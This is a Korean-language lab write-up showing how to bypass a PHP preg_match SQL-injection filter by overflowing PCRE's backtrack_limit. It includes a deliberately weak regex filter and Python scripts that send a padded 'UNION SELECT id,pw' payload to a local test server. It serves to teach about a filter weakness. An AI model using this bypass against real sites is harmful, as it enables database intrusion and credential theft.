# PCRE Bypass

[PCRE](#https://ko.wikipedia.org/wiki/%ED%8E%84_%ED%98%B8%ED%99%98_%EC%A0%95%EA%B7%9C_%ED%91%9C%ED%98%84%EC%8B%9D)(Perl Compatible Regular Expressions)의 검사 수 제한(catastrophic backtracking)을 이용하여 우회

# **INDEX**

**1. [환경 구성](#환경-구성)**

**2. [preg_match](#preg_match)**

# **환경 구성**

| Type          | Version                   |
| :---          | :---                      |
| OS            | Ubuntu 20.04.3 LTS        |
| Architecture  | x86-64                    |
| IP            | 192.168.108.174           |
| apache2       | 2.4.41-4ubuntu3.10        |
| php           | 7.4.3                     |

apache와 php를 사용하기 위해 관련 패키지를 설치하자.

```sh
root@ubuntu:~# apt -y install apache2 php
```

preg_match를 이용하여 SQLi를 방어하는 코드를 적용하였다.

```php
<?php
if(preg_match('/UNION.+?SELECT/i', $_POST['sql'])) die('SQL Injection');
else echo "pass";
?>
```

pcre의 최대 검사 수를 확인해보자.

```sh
user@user:/var/www/html$ php -r "var_dump(ini_get('pcre.backtrack_limit'));"
string(7) "1000000"
```

# **preg_match**

다음의 sql문을 전달하면 preg_match에 의해서 if문으로 들어간다.

```python
import requests

url = 'http://192.168.108.174/index.php'
data = {'sql': 'UNION SELECT id,pw FROM USER -- '}
res = requests.post(url=url, data=data)
print(res.text)
```

하지만 backtrack_limit 보다 큰 데이터를 전송하면 preg_match의 결과가 false(0)으로 반환되어 else문으로 우회할 수 있다.

```python
import requests

url = 'http://192.168.108.174/index.php'
data = {'sql': 'UNION /*'+'a'*1000000+'*/ SELECT id,pw FROM USER -- '}
res = requests.post(url=url, data=data)
print(res.text)
```